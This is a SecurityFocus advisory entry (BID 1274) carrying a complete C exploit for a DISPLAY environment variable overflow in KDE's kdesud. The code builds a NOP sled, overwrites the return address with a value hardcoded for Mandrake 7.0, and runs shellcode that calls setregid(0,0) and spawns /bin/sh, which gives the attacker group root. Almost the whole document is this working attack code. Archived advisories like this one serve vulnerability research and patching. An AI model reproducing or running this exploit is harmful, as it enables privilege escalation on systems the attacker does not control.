source: http://www.securityfocus.com/bid/1274/info

/usr/bin/kdesud has a DISPLAY environment variable overflow which could allow for the execution of arbitrary code. 

/*  KDE: /usr/bin/kdesud exploit by noir
 *  x86/Linux
 *  noir@gsu.linux.org.tr | noir@olympos.org
 *  DISPLAY env overflow 
 *  this script will get you gid = 0 !!  
 *  tested on Mandrake 7.0 (Air), for other distros play with argv1 for eip  
 *  greetz: dustdevil, Cronos, moog, still, #olympos irc.sourtimes.org 
 *      
 */

#include <stdio.h>
#include <string.h>

#define NOP             0x90
#define ALIGN   2
#define RET     0xbffff664  // Mandrake 7.0 (x86) 
                            
int 
main(int argc, char *argv[])
{
        unsigned char shell[] =
        "\x31\xc0\x89\xc3\x89\xc1\xb0\x47\xcd\x80" /* setregid(0, 0) */
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh"; 

        char buf[400];
        int i, a;
        long ret = RET;

     if(argv[1])
        ret = ret - atoi(argv[1]);               
  
        memset(buf, NOP, 400);
    
        for(i = ALIGN  ; i < 160 + ALIGN; i+=4)
                *(long *) &buf[i] = ret;
    
        for( i = 300, a = 0; a < strlen(shell) ; i++, a++ )
        buf[i] = shell[a];
        
        buf[399] = 0x00;
        printf("eip: 0x%x\n", ret);

        setenv("DISPLAY", buf, 1);
        execl("/usr/bin/kdesud", "kdesud",  0);

}

